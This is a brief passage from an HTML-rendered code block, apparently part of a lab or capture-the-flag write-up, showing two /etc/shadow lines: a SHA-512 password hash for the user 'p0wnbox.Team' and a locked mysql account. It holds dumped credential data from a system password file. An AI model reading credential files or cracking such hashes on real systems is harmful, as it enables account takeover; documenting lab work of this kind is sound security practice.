-</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
-</span><span class='line'>mysql:!!:14981::::::
-</span></code></pre></td></tr></table></div></figure>
-
 </div>
   
   
